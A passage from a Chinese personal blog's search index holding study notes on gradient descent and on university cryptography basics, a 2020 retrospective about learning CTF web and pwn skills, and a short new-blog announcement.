id="2-4代价函数-三"><a href="#2-4代价函数-三" class="headerlink" title="2.4代价函数(三)"></a>2.4代价函数(三)</h2><p>当我们使用$\theta_0$和$\theta_1$时，得到cost function图像类似下图</p><p><img src="https://i.loli.net/2021/03/06/skDZCp4OwtTFYib.png" alt=""></p><p>使用等高线的方式来模拟，想象从碗的上方向底部看，minimize J($\theta_0$,$\theta_1$) 就是椭圆的中心，如下图的数据拟合较为不错，cost value可以接受</p><p><img src="https://i.loli.net/2021/03/06/JVmZ7oFTpRDU1zd.png" alt=""></p><h2 id="2-5-梯度下降"><a href="#2-5-梯度下降" class="headerlink" title="2.5 梯度下降"></a>2.5 梯度下降</h2><p>Repeat until convergence{</p><p>​    $\theta_j := \theta_j - \alpha\frac{\partial}{\partial\theta_j}J(\theta_0,\theta_1)  $        (for j = 0 and j = 1) </p><p>}</p><p>// := assignment       ( a := a + 1)</p><p>// $\alpha$为学习率，大的时候下山步子大</p><p><img src="https://i.loli.net/2021/03/09/gQYal6ocdpKqC9R.png" alt="梯度下降1.png" style="zoom:50%;" /></p><h2 id="2-6-梯度下降理解"><a href="#2-6-梯度下降理解" class="headerlink" title="2.6 梯度下降理解"></a>2.6 梯度下降理解</h2><ul><li>梯度下降导数项的意义</li></ul><p><img src="https://i.loli.net/2021/03/09/CyXR7G4TLIKQO1w.png" alt="梯度下降2.png" style="zoom:50%;" /></p><ul><li>梯度下降学习率大小的意义</li></ul><p><img src="https://i.loli.net/2021/03/09/N1mFSpIkrPAnljb.png" alt="梯度下降3-alpha含义.png" style="zoom:50%;" /></p><ul><li>梯度下降到局部最优点的结果</li></ul><p><img src="https://i.loli.net/2021/03/09/nSg2xDTV7yROecG.png" alt="梯度下降4-局部最优点的结果.png" style="zoom:50%;" /></p><h2 id="2-7-线性回归的梯度下降"><a href="#2-7-线性回归的梯度下降" class="headerlink" title="2.7 线性回归的梯度下降"></a>2.7 线性回归的梯度下降</h2><p>梯度下降中导数那一项：</p><script type="math/tex; mode=display">\frac\partial{\partial\theta_j}J(\theta_0,\theta_1) = \frac\partial{\partial\theta_j}\frac1{2m}\sum_{i=1}^m(h_\theta(x^{(i)})-y^{(i)})^2 \\=\frac\partial{\partial\theta_j}\frac1{2m}\sum_{i=1}^m(\theta_0 + \theta_1x^{i}-y^{(i)})^2</script><p>$\theta_0$和$\theta_1$情况下的偏导数：</p><script type="math/tex; mode=display">j=0:\frac\partial{\partial\theta_0}J(\theta_0,\theta_1)=\frac1{m}\sum_{i=1}^m(h_\theta(x^{(i)})-y^{(i)}) \\j=1:\frac\partial{\partial\theta_1}J(\theta_0,\theta_1)=\frac1{m}\sum_{i=1}^m(h_\theta(x^{(i)})-y^{(i)})*x^{(i)}</script><p>该方法是Batch梯度下降法：需要遍历整个训练集</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Machine Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学笔记</title>
      <link href="2021/03/05/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/"/>
      <url>2021/03/05/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="一-密码学概述和古典密码"><a href="#一-密码学概述和古典密码" class="headerlink" title="一.密码学概述和古典密码"></a>一.密码学概述和古典密码</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><strong>密码编码学</strong>和密码分析学</p><blockquote><p>Plaintext:明文，被隐蔽消息，M</p><p>Ciphertext:密文，C</p><p>Encryption:加密</p><p>Decryption:解密，加密的逆过程</p><p>Encryption algorithm: 加密算法，E()</p><p>Decryption algorithm: 解密算法，D()</p><p>Key: 密钥，控制加密和解密算法操作的数据处理，分别称作加密密钥和解密密钥，k</p></blockquote><ul><li>传统密码体制所用的加密密钥和解密密钥相同或<strong>实质上等同</strong>，从一个易于推出另一个：单钥或对称密码体制，无法实现不可否认性</li><li>加密密钥和解密密钥不相同，从一个难于推出另一个，双钥，或非对称密码体制</li></ul><p>密码体系是一个五元组(M C K E D)</p><p>密钥空间K，在单钥体制下K1 = K2 = K</p><p>加密变换$E_{k1}$</p><p>解密变换$D_{k2}$</p><p><strong>(M C K $E<em>{k1}$ $D</em>{k2}$)为保密通信系统</strong></p><p>密码分析者，选定变换函数h，对c进行变换，得到的明文是明文空间中的某个元素，</p><p>即$m’ = h(x)$</p><p>如果m’ = m，则分析成功</p><h3 id="保密系统基本要求"><a href="#保密系统基本要求" class="headerlink" title="保密系统基本要求"></a>保密系统基本要求</h3><ol><li>理论上不可破，即 $ p_r{m’=m}=0 $，当知道已知的明文密文时，要决定密钥或任意明文在计算上是不可行的</li><li>Kerchhoff原则，保密性不依赖于加密体制或算法的保密，而依赖于密钥</li><li>加密解密算法适用于所有密钥空间中的元素</li><li>系统便于实现和使用</li></ol><h3 id="密码系统的攻击"><a href="#密码系统的攻击" class="headerlink" title="密码系统的攻击"></a>密码系统的攻击</h3><ul><li>惟密文攻击</li><li>已知明文攻击</li><li>选择明文攻击</li><li>选择密文攻击</li></ul><div class="table-container"><table><thead><tr><th>攻击类型</th><th style="text-align:left">攻击者掌握的内容</th><th></th></tr></thead><tbody><tr><td>惟密文攻击</td><td style="text-align:left">加密算法，截获的部分密文</td><td></td></tr><tr><td>已知明文攻击</td><td style="text-align:left">以上及一个或多个明文密文对</td><td></td></tr><tr><td>选择明文攻击</td><td style="text-align:left">自己选择的明文消息及由密钥产生的密文</td><td></td></tr><tr><td>选择密文攻击</td><td style="text-align:left">自己选择的密文消息及相应的被解密的明文</td><td></td></tr><tr><td></td><td style="text-align:left"></td></tr></tbody></table></div><p>无条件安全：无论敌手截获多少密文，花费多长时间都不能解密密文 （一次一密</p><p>计算上安全：1，破译密文的代价超过被加密信息的价值。2，破译密文所花的时间超过信息的有用期。</p><h2 id="密码学发展"><a href="#密码学发展" class="headerlink" title="密码学发展"></a>密码学发展</h2><p>Cryptology - 密码学</p><blockquote><p>三个阶段：</p><p>1.1949之前：古典密码 艺术</p><p>2.1949-1975：近代密码 艺术-&gt;科学</p><p>3.1976年至今：现代密码</p></blockquote><p>古典密码：</p><ol><li>斯巴达棍。算法是缠绕，密钥是棍子的粗细。</li><li>单表代换密码：凯撒密码，单字母代换。算法是代换，密钥是密码表。</li><li>多表代换密码：Enigma密码机。</li></ol><p>近代密码：</p><ol><li>1977年，NBS颁布采纳IBM设计的方案作为非机密数据的数据加密标准DES，Data Encryption Standard。</li><li>2001.11.16，采用AES算法</li><li>1976，W.Diffie，M.E.Hellman，提出非对称密码算法思想</li><li>1977，Rivest，Shamir，Adleman提出RSA密码体制</li></ol><p>公钥密码学实现加密密钥和解密密钥的分离，伟大革命，使用两个密钥：公钥，私钥</p><h2 id="仿射变换"><a href="#仿射变换" class="headerlink" title="仿射变换"></a>仿射变换</h2><p>$c = E_{a,b}(m) \equiv am + b(mod26)$</p><p>$m = D_{a,b}(c) \equiv a^{-1} + (c - b)(mod26)$</p><p>当a和26互为素数的时候才可以解密 最大公因子为1时才互为素数 （不互素的话逆元求不出来，就没法解密</p><p>ab为密钥</p><p>$a^{-1}$为a的逆元</p><h3 id="单表代换优缺点"><a href="#单表代换优缺点" class="headerlink" title="单表代换优缺点"></a>单表代换优缺点</h3><p>频次问题</p><p>相对位置问题</p><h2 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h2><p>加密算法</p><p>$c<em>{i+td}=E_k(m</em>{i+td})\equiv(m_{i+td}+k_i)(mod q)$</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.理解保密通信系统模型</p><p>2.密码体制从原理分为两大类，单钥和双钥体制</p><p>3.加密算法两条安全准则</p><p>4.能够计算仿射变换</p><p>5.置换密码的操作</p><h1 id="二-密码学相关数学知识"><a href="#二-密码学相关数学知识" class="headerlink" title="二.密码学相关数学知识"></a>二.密码学相关数学知识</h1><h2 id="1-素数和互素"><a href="#1-素数和互素" class="headerlink" title="1.素数和互素"></a>1.素数和互素</h2><ul><li><p>因子</p><ul><li>b能整除a，b|a : b是a的因子</li><li>b|1    b = $\pm$1</li><li>b|a a|b 则 a=$\pm$b</li><li>b|a  b|c. 则对于任意整数m和n  -&gt; b|(am+cn)</li></ul></li><li><p>素数</p><ul><li>素数是现代数论的核心内容</li><li>p的因子只有 $\pm$1和 $\pm$p</li><li>整数分解的唯一性定理 任一正整数可以唯一分解成素数的乘积<ul><li>$a = p_1^{e_1} + p_2^{e_2} + … + p_t^{e_t}$</li><li>$e_i$是正整数 $p_i$是素数</li></ul></li></ul></li><li><p>互素数 </p><ul><li>c是a和b的最大公因子 c=gcd(a,b)</li><li>因为所有不为0的整数都是0的因子，因此，gcd(a,0) = |a|</li><li><p>如果gcd(a,b) = 1，则称a，b是互素的</p></li><li><p>最小公倍数 lcm。d是a和b的最小公倍数，d=lcm(a,b)</p></li><li>若gcd(a,b) = 1，则lcm(a,b) = a * b</li></ul></li></ul><h2 id="2-模运算"><a href="#2-模运算" class="headerlink" title="2.模运算"></a>2.模运算</h2><ul><li><p>数论</p><ul><li><p>是密码学特别是公钥密码学的基本工具</p></li><li><p>离散的数字集合</p></li><li><p>运算是模加，模减，逆运算</p></li><li><p>对整数和多项式进行模运算</p></li><li><p>字母的通用表示：</p><ul><li>n: 非负整数</li><li><p>p: 素数</p></li><li><p>Z: 整数集合</p></li><li>R: 实数集合</li><li><p>Q: 有理数集合</p></li><li><p>$Z_n$ = {0,1,2…n-1}小于n的非负整数集合</p></li></ul></li></ul></li><li><p>模运算</p><ul><li>a = $\lfloor a/n\rfloor$ n + (a mod n)</li></ul></li><li><p>同余</p><ul><li>a mod n= b mod n    a $\equiv$ b mod n</li><li>n|(a-b) 等价a $\equiv$ b mod n</li></ul></li><li><p>同余性质</p><ul><li>a $\equiv$ b mod n，则b $\equiv$ a mod n</li><li>a $\equiv$ b mod n，b $\equiv$ c mod n，则a $\equiv$ c mod n</li><li>a $\equiv$ b mod n，d｜n，则a $\equiv$ b mod d</li><li>a $\equiv$ b mod $n_i$ ， d = lcm($n_1,n_2,…n_k$)，则a $\equiv$ b mod d，(i = 1,2,…,k)</li></ul></li><li><p>同余类/等价类/模n剩余类</p><ul><li>与a模n同余的全体成为a的同余类记为$[a]_n$</li><li>$Z_n$为模n的等价类集合</li></ul></li><li><p>等价类性质</p><ul><li>在做mod n的加法和乘法时，等价类的元素可以替换，结果不变</li></ul></li><li><p>模运算性质</p><ul><li>加运算和乘运算先做模和后做模不影响结果</li><li>满足交换律，结合律，分配律</li><li>单位元，0是加法单位元，1是乘法单位元</li></ul></li></ul><h2 id="3-模指数运算"><a href="#3-模指数运算" class="headerlink" title="3.模指数运算"></a>3.模指数运算</h2><p>模指数运算</p><ul><li>$a^m \pmod p$</li><li>思路：现将m用二进制表示</li><li>？快速指数运算查询</li><li>阶 $ord_n(a)$， 满足 $a^m \equiv $ 1 mod n 的最小正整数m为模n下a的阶</li><li>$ord_n(a)$ = m，$ a^k \equiv 1$ mod n的充要条件是k为m的倍数</li></ul><h2 id="4-费马定理和欧拉定理"><a href="#4-费马定理和欧拉定理" class="headerlink" title="4.费马定理和欧拉定理"></a>4.费马定理和欧拉定理</h2><ul><li>费马定理<ul><li>p是素数，a是正整数，且gcd(a,p) = 1,则$a^{p-1}\equiv1$ mod p</li><li>$aa^{p-2}\equiv$ mod p 或者 $a^{-1} \equiv a^{p-2}$ mod p</li><li>$2^{100}  $ mod 13 = 3 (满足费马定理，即$2^{12} \equiv 1$ mod 13，即$2^{96} \equiv 1$ mod 13)  </li></ul></li></ul><h2 id="5-素性检测"><a href="#5-素性检测" class="headerlink" title="5.素性检测"></a>5.素性检测</h2><p>素性检测就是对给定的数检验是否为素数</p><p>费马定理的逆命题不成立，伪素数（卡米歇尔数）</p><ul><li>埃拉托斯散筛法</li><li><p>Miller-Rabin概率检测法</p><h2 id="6-欧几里得算法"><a href="#6-欧几里得算法" class="headerlink" title="6.欧几里得算法"></a>6.欧几里得算法</h2></li></ul><p>辗转相除法</p><h2 id="7-中国剩余定理"><a href="#7-中国剩余定理" class="headerlink" title="7.中国剩余定理"></a>7.中国剩余定理</h2><p>小数重构大数</p><p>大数用小数表示</p><h2 id="8-群环域"><a href="#8-群环域" class="headerlink" title="8.群环域"></a>8.群环域</h2><ul><li><p>代数系统</p><ul><li>代数系统是一种数学模型，包含要处理的数学对象的集合及集合上的关系或运算。</li><li>群，环，域都是代数系统。</li></ul></li><li><p>半群</p><ul><li>任取ab属于S，a和b的运算*都在S中，则S对运算*是封闭的</li><li>满足结合律</li><li>满足以上两点，称为<G,*>为半群</li></ul></li><li><p>群</p><ul><li>封闭性</li><li>结合律</li><li>单位元：$a<em>e = e</em>a = a$，e称为$<G,*>$的单位元</li><li>逆元：对任取a属于G，存在元素$a^{-1}$,$a <em> a^{-1} = a^{-1} </em> a = e$</li><li>满足以上几点称为$<G,*>$是群</li><li>实例 $<Z_8,+>$，模8加</li><li>实例 XOR，模2加</li><li>实例，加法群<ul><li>对任意n大于等于1，整数模n的集合构成一个包含n个元素的有限模n加法群，单位元是0，群中任一元素a，它的逆元是n-a，这个群记为$Z_n$</li></ul></li><li><p>实例，乘法群不是群，是幺半群，不满足逆元的条件</p></li><li><p>乘法群 $Z_n^*$</p><ul><li>$Z_n^*={x\in Z_n:gcd(x,n)=1}$，小于n的非负整数且与n互素</li><li>模n乘法群，单位元e = 1</li><li>是abel群，$|Z_n^*| = \psi(n)$</li><li>对素数p，$Z_p^* = Z_p - 0$</li></ul></li></ul></li></ul><ul><li><p>Abel群</p><ul><li>运算*表示加法时，称为加法群</li><li>乘法，乘法群</li><li>若G的元素是有限的，称为有限群，否则为无限群</li><li>有限群中，G的元素个数称为群G的阶数，表示为$|G|$ or $#G$</li><li>还满足交换律，则称为群$<G,*>$为Abel群</li><li><p>密码学中用到的几乎都为Abel群</p></li><li><p>实例 $<Z_8,+>$，模8加，阶为8</p></li></ul></li></ul><ul><li>循环群<ul><li>$g^i = a$，a为任意的一个元素，g为生成元或本原元</li><li>即能够自己对自己做运算，最终能够遍历群</li><li>实例<ul><li>$Z_4$</li><li>$Z_p^*$，p为素数，肯定存在生成元<ul><li>定理$Z_n^*$每一个元素都有乘法逆元</li><li>并不是每一个元素都是生成元</li></ul></li></ul></li><li>本原元的存在性<ul><li>对模素数p<ul><li><ol><li>其生成元必定存在</li><li>当g为生成元且p与p-1互素时，$g^a$  mod p也是生成元</li><li>生成元个数为$\psi(p-1)$</li></ol></li></ul></li></ul></li></ul></li></ul><ul><li>元素的阶<ul><li>拉格朗日定理推论，提供了群的阶和群中元素阶的关系</li></ul></li></ul><ul><li>环<ul><li>$<R,+>$是Abel群</li><li>$<R,*>$是半群</li><li>分配律</li><li>$<R,+,*>$是环</li></ul></li></ul><ul><li>域<ul><li>$<F,+>$ 是Abel群，0是+的单位元</li><li>$<F-0,*>$ 是Abel群</li><li>分配律</li><li>$<F,+,*>$是域</li></ul></li></ul><ul><li>有限域<ul><li>若q是素数的幂，即$q = p^n$ ，p是素数，n是正整数，则阶为q的域记为GF(q)</li></ul></li></ul><h2 id="9-离散对数"><a href="#9-离散对数" class="headerlink" title="9.离散对数"></a>9.离散对数</h2><h2 id="10-平方剩余"><a href="#10-平方剩余" class="headerlink" title="10.平方剩余"></a>10.平方剩余</h2><h2 id="11-小结"><a href="#11-小结" class="headerlink" title="11.小结"></a>11.小结</h2><h1 id="三-应用密码学"><a href="#三-应用密码学" class="headerlink" title="三.应用密码学"></a>三.应用密码学</h1><h2 id="1-流密码"><a href="#1-流密码" class="headerlink" title="1.流密码"></a>1.流密码</h2><p>流密码的基本思想：利用密钥k产生一个密钥流，使用规则对明文串加密</p><p>与维吉尼亚类似，多表代换密码</p><p>密钥流通过密钥发生器f产生</p><p> $z_i = f(k,\theta_i)$</p><p>分组密码和流密码的区别在于有无记忆性</p><p>流密码的滚动密钥，由函数f，密钥k和初始状态西格玛完全确定。此后，输入的密文可能影响加密器中内部记忆元件的存储状态，因而可能依赖<strong>于所有输入</strong>的影响。</p><p>可分为同步和自同步两种</p><p>对称密码体制</p><p>同步流密码的变换$E_i$可以有多种选择，只要变换即可逆即可。</p><p>二元加法流密码是最常用的流密码的体制。即异或。</p><p>密钥流序列Z应该具有如下性质</p><ul><li>极大的周期</li><li>良好的统计特性</li><li>抗线性分析</li><li>抗统计分析</li></ul><h3 id="有限状态自动机"><a href="#有限状态自动机" class="headerlink" title="有限状态自动机"></a>有限状态自动机</h3><p>是具有离散输入和输出的一种数学模型，由三部分组成</p><ol><li>有限状态集</li><li>有限输入字符集，有限输出字符集</li><li>转移函数</li></ol><h3 id="密钥流产生器"><a href="#密钥流产生器" class="headerlink" title="密钥流产生器"></a>密钥流产生器</h3><p>关键是密钥流产生器。一般可将其看成为参数为k的有限状态自动机，有输出符号集，一个状态集，和两个函数以及一个初始状态组成</p><p>两个函数为状态转移函数和字符输出函数</p><p>LFSR：线性反馈移位寄存器</p><p>最大周期为2的n次方减1，n是几级寄存器</p><h2 id="2-分组密码体制"><a href="#2-分组密码体制" class="headerlink" title="2.分组密码体制"></a>2.分组密码体制</h2><p>对称密码体制</p><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h3><ul><li><p>加密解密</p></li><li><p>构成其他加密算法的组成元素</p></li></ul><ul><li>明文</li><li>明文分组</li><li>密钥</li><li>密文分组</li><li>加密函数</li></ul><p>通常取密文分组数量和明文分组数量相等</p><ul><li>要求<ul><li>分组长度n足够大，防止明文穷举攻击法</li><li>密钥量足够大，即置换子集中的元素足够多，以防止密钥穷举攻击，但又不能过长，管理问题</li><li>由密钥确定置换的算法要足够复杂</li><li>加密和解密运算简单，易于软件和硬件高速实现</li></ul></li></ul><h3 id="2-DES"><a href="#2-DES" class="headerlink" title="2.DES"></a>2.DES</h3><p>密钥长度为56位</p><h3 id="3-分组密码体制的运行模式"><a href="#3-分组密码体制的运行模式" class="headerlink" title="3.分组密码体制的运行模式"></a>3.分组密码体制的运行模式</h3><h3 id="4-IDEA"><a href="#4-IDEA" class="headerlink" title="4.IDEA"></a>4.IDEA</h3><h3 id="5-AES"><a href="#5-AES" class="headerlink" title="5.AES"></a>5.AES</h3>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 校内课程笔记 </tag>
            
            <tag> Cryptography </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020年度总结</title>
      <link href="2021/03/05/2020%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
      <url>2021/03/05/2020%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="1-3月"><a href="#1-3月" class="headerlink" title="1-3月"></a>1-3月</h2><p>1-3月啥也不会，铁fw罢了，在学校摸摸鱼，电子人，电脑小白-.-</p><h2 id="3月"><a href="#3月" class="headerlink" title="3月"></a>3月</h2><p>接触网络安全源于一个电影，挺感兴趣的，在全网搜索相关文献资料啥的，也啥也不会，后来发现ctf比赛，想着学学吧，从web安全开始了，记得一开始是听的哔哩哔哩课程，什么从入门到入狱啥的，师傅其实讲的很好，那个时候学会了sql注入，xss啥的，不过只知道原理，并不会相关操作。<br>后来发现一个网站叫bugku，开始刷题了，一开始过程是自闭的，什么f12都不会，然后开始陆陆续续学JavaScript前端啥的，php和mysql也简单学学，后来面向wp做题有了一点点感觉。</p><h2 id="4-5月"><a href="#4-5月" class="headerlink" title="4-5月"></a>4-5月</h2><p>由于疫情的爆发没有开学，上网课，就很nice，然后就不听课，开始疯狂自学做题，当时啥都学早6点到晚12点左右，python php JavaScript linux …… 反正就是什么都会一点但是不精细。<br>后来打比赛，直接自闭了，认识了堆堆师傅，当时堆堆师傅主方向是web副方向是pwn，很羡慕，太羡慕pwn👴👴了，然后堆堆告诉我一个网站叫buuoj，让我开始做那个东西，然后就开始入坑buu了，记得第一道题好像是目录穿越还是反序列化不太记得了，从白天一直做到凌晨，各种抄wp复现，打击太大了，然后堆堆师傅凌晨4点多教我怎么做呜呜呜太感动了，然后告诉我说极客大挑战系列的题目比较简单，我就开始挑简单题做。然后从哔哩哔哩疯狂听课，后来学了两周misc，在MRCTF新生赛上出了一两个web和四五道misc，太满足了，第一次找到成就感，然后后来一个啥比赛又整自闭了。然后进入迷茫期。中间我帮七星师傅了录了一期长亭科技师傅做的pwn课程，那是什么鬼啊从头到尾全程懵逼，就硬生生给👴听睡着了。</p><h2 id="6-7月"><a href="#6-7月" class="headerlink" title="6-7月"></a>6-7月</h2><p>下学期快考试了，然后转专业啥的，由于上学期成绩还可以，然后就想着转个专业8，本来是想选网安的，但是竟然不能转因为是新开的专业啊可恶，然后又想转计科，但是看到人才培养方案发现网络专业竟然有安全课于是来到了网络专业，后话了（<br>然后快考试了，啥也没学这学期，开始疯狂补课，电路从第三章👴就没听懂过，猴博士yyds，高数二边听课边玩游戏，高数叔yyds。最终都考的还行。然后web方向面临瓶颈了，开始过渡pwn。<br>没有课程，从汇编开始学，贼痛苦，晚上做梦都是噩梦。反正那段时间挺难受的。<br>用了一段时间把wiki上的大部分栈知识点搞定之后开始冲刺堆部分。<br>怎么说呢，堆部分刚开始对于👴来说简直是地狱。没有学过数据结构，文献看不懂，又没有视频资料，七星师傅群里也没有pwn手，就很难受，当时星盟的一个师傅出了一套pwn课程，堆部分只有一丢丢，但是很满足了，慢慢啃wiki，最后还是学到了很多东西。</p><h2 id="8-9月"><a href="#8-9月" class="headerlink" title="8-9月"></a>8-9月</h2><p>旅游，各种玩耍，咕了</p><h2 id="9-12月"><a href="#9-12月" class="headerlink" title="9-12月"></a>9-12月</h2><p>下学期开始了，新班级，带了一个舍友开始学ctf，同班同学碰见一个特别强的师傅，后来认识了一下才知道这个师傅是计算机大类的系第一，高中就开始搞技术了，web手，膜。然后继续pwn，基本上一天两到三个buu吧，不会就记录查wp，技术上是有一定进步的，然后打了省的一个小比赛拿了一个二等奖，后来跟web师傅组队又打了一个线下赛拿了第一名，挺满意的。然后陆陆续续做题，把buu的一分pwn做完了，当时pwn总榜排名也进入前50了，然后就是复习课准备考试了，中间还成立了我们校的第一个ctf社团，感谢各位老师的支持和帮助</p><h2 id="2021"><a href="#2021" class="headerlink" title="2021"></a>2021</h2><p>最终寒假来了，摸了一个寒假，学了几天的运维</p><p>2021开学了，准备继续学pwn，堆部分还没有结束，还是跟师傅们差的太远，不过这一年认识很多hxd，校内师傅不用说了，堆堆师傅，七星师傅，雪殇师傅，Mz1师傅，Fz师傅，N神，低调的L0ne1y师傅等等，路很长，加油，共勉！</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>New</title>
      <link href="2021/03/05/New/"/>
      <url>2021/03/05/New/</url>
      
        <content type="html"><![CDATA[<h3 id="新博客！"><a href="#新博客！" class="headerlink" title="新博客！"></a>新博客！</h3><p>原博客地址：<a href="https://cnblogs.com/lemon629/">https://cnblogs.com/lemon629/</a></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
